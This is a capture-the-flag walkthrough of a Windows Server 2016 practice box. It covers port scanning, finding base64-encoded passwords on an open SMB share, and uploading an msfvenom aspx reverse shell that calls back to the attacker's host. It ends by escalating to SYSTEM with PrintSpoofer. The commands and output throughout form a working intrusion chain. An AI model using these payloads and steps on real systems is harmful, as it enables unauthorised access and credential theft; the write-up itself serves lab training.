@@ -1,0 +1,265 @@
+Relevant Writeup
+
+Scanning the Box
+
+# nmap -sC -sV -p- -A -T5 10.10.65.144                                                                        
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 11:06 PDT
+Nmap scan report for 10.10.65.144
+Host is up (0.15s latency).
+Not shown: 65527 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2020-09-06T18:11:14+00:00
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2020-07-24T23:16:08
+|_Not valid after:  2021-01-23T23:16:08
+|_ssl-date: 2020-09-06T18:11:54+00:00; +1s from scanner time.
+49663/tcp open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
+OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
+Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-09-06T11:11:16-07:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-09-06T18:11:18
+|_  start_date: 2020-09-06T18:04:28
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT       ADDRESS
+1   13.69 ms  10.13.0.1
+2   ... 3
+4   154.11 ms 10.10.65.144
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 332.91 seconds
+
+Takeaways:
+webservers on ports 80 and 49663
+SMB on 445
+RDP on 3389
+Microsoft Windows Server 2016
+
+Enumerating SMB
+
+# smbclient -L 10.10.65.144                                                                                   
+Enter WORKGROUP\root's password:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        nt4wrksv        Disk
+SMB1 disabled -- no workgroup available
+
+Lets check nt4wrksv share
+
+# smbclient \\\\10.10.65.144\\nt4wrksv
+Enter WORKGROUP\root's password:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Jul 25 14:46:04 2020
+  ..                                  D        0  Sat Jul 25 14:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 08:15:33 2020
+
+                7735807 blocks of size 4096. 5137268 blocks available
+
+getting the file gives us base64 encoded credentials
+# cat passwords.txt
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+
+# echo cred | base64 -d
+
+Bob - !P@$$W0rD!123
+Bill - Juw4nnaM4n420696969!$$$ 
+
+Lets go ahead and validate these credentials with Impacket psexec
+
+# psexec.py bill:'Juw4nnaM4n420696969!$$$'@10.10.65.144                                                         1 
+Impacket v0.9.22.dev1+20200728.230151.48a3124c - Copyright 2020 SecureAuth Corporation
+
+[-] Authenticated as Guest. Aborting
+
+# psexec.py bob:'!P@$$W0rD!123'@10.10.65.144                                                                  130 
+Impacket v0.9.22.dev1+20200728.230151.48a3124c - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.65.144.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[*] Found writable share nt4wrksv
+[*] Uploading file wtTluMtU.exe
+[*] Opening SVCManager on 10.10.65.144.....
+[-] Error opening SVCManager on 10.10.65.144.....
+[-] Error performing the installation, cleaning up: Unable to open SVCManage
+
+Takeaways:
+found credentials for two users bob and bill
+it appears that the bill user has truoble authenticating and might not be on the system
+bob does appear to be on the system but his credentials don't work; perhaps we will find a better way to attack the bob user on the webservers...
+
+Enumerating Webservers
+
+Both webservers ports have default IIS pages
+Lets use gobuster to try and find any subdirectories
+
+#gobuster dir -u http://10.10.65.144 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
+
+#gobuster dir -u http://10.10.65.144:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
+
+We don't find anything on port 80, however on 49663 we find a /nt4wrksv directory matching the share we found earlier. Navigating to the diretory itself doesn't show anything, but lets try and access the passwords.txt file we found earlier
+
+http://10.10.65.144:49663/nt4wrksv/passwords.txt
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+
+since we can access the file let's see if we can write to the web directory with a test file
+# echo testing > test.txt
+
+# smbclient \\\\10.10.65.144\\nt4wrksv
+Enter WORKGROUP\root's password:
+Try "help" to get a list of possible commands.
+smb: \> put test.txt
+putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
+smb: \>
+
+http://10.10.65.144:49663/nt4wrksv/test.txt
+testing
+
+We can in fact write to the web directory so now its time for exploitation
+
+Exploitation
+
+Let use msfvenom to create a payload
+Things we need to know/realize
+	IIS typically requires an aspx shell
+	Windows Server 2016 uses x64 architecture
+with that in mind 
+
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.1.12 LPORT=53 -f aspx -o rshell.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3409 bytes
+Saved as: rshell.aspx
+
+# smbclient \\\\10.10.65.144\\nt4wrksv                   
+Enter WORKGROUP\root's password:
+Try "help" to get a list of possible commands.
+smb: \> put rshell.aspx
+putting file rshell.aspx as \rshell.aspx (7.3 kb/s) (average 7.3 kb/s)
+smb: \>
+
+# nc -nlvp 53
+listening on [any] 53 ...
+connect to [10.13.1.12] from (UNKNOWN) [10.10.74.19] 49798
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+
+Lets check for privileges
+
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+SeImpersonatePrivilege is enabled and definitely a common attack vector using tokens impersonation
+Printspoofer which only requires the SeImpersonatePrivilege on a service account allows us to exploit this
+
+# smbclient \\\\10.10.142.97\\nt4wrksv
+Enter WORKGROUP\root's password:
+smb: \> put PrintSpoofer.exe
+putting file PrintSpoofer.exe as \PrintSpoofer.exe (43.2 kb/s) (average 27.5 kb/s)
+smb: \>
+
+on the target box
+c:\inetpub\wwwroot\nt4wrksv>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\inetpub\wwwroot\nt4wrksv
+
+09/06/2020  01:23 PM    <DIR>          .
+09/06/2020  01:23 PM    <DIR>          ..
+07/25/2020  08:15 AM                98 passwords.txt
+09/06/2020  01:23 PM            27,136 PrintSpoofer.exe
+09/06/2020  01:23 PM             3,409 rshell.aspx
+               3 File(s)         30,643 bytes
+               2 Dir(s)  20,279,685,120 bytes free
+
+c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+and we have successfully escalated to root sytem authority 
+we can find the flags we are looking for in Bob and Administrator's repspective desktops 
